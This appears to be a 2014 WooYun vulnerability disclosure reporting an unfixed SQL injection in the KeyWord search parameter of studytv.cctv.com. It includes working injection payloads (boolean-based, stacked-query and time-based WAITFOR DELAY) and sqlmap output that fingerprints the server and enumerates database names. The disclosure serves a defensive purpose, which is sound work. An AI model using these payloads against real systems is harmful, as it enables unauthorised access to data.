wybug_title: cctv某种修复不善依然存在注入
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail: 漏洞详情 披露状态：   									2014-12-16：	细节已通知厂商并且等待厂商处理中									2014-12-21：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： cctv某种修复不善依然存在注入 详细说明：  之前有白帽子报告过，貌似没修复妥善，还是可以跑出数据注入点：http://studytv.cctv.com/activity/list?KeyWord=1%' and '%'='   漏洞证明：  sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: KeyWord    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: KeyWord=1%' AND 1853=1853 AND '%'='    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: KeyWord=1%'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: KeyWord=1%' WAITFOR DELAY '0:0:5'-----[06:16:08] [INFO] testing Microsoft SQL Server[06:16:08] [INFO] confirming Microsoft SQL Server[06:16:08] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 8 or 2012web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 8.0back-end DBMS: Microsoft SQL Server 2012[06:16:08] [INFO] fetching database names[06:16:08] [INFO] fetching number of databases[06:16:08] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[06:16:08] [INFO] retrieved: [06:16:08] [WARNING] reflective value(s) found and filtering out5[06:16:10] [INFO] retrieved: KK_BOSS_DB[06:16:45] [INFO] retrieved: master[06:17:06] [INFO] retrieved: model[06:17:24] [INFO] retrieved: msdb[06:17:38] [INFO] retrieved: tempdbavailable databases [5]:[*] KK_BOSS_DB[*] master[*] model[*] msdb[*] tempdb[06:17:57] [INFO] fetched data logged to text files under '/root/.sqlmap/output/studytv.cctv.com'   修复方案：  你懂   版权声明：转载请注明来源 greg.wu@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-21 11:32 厂商回复：  最新状态： 暂无
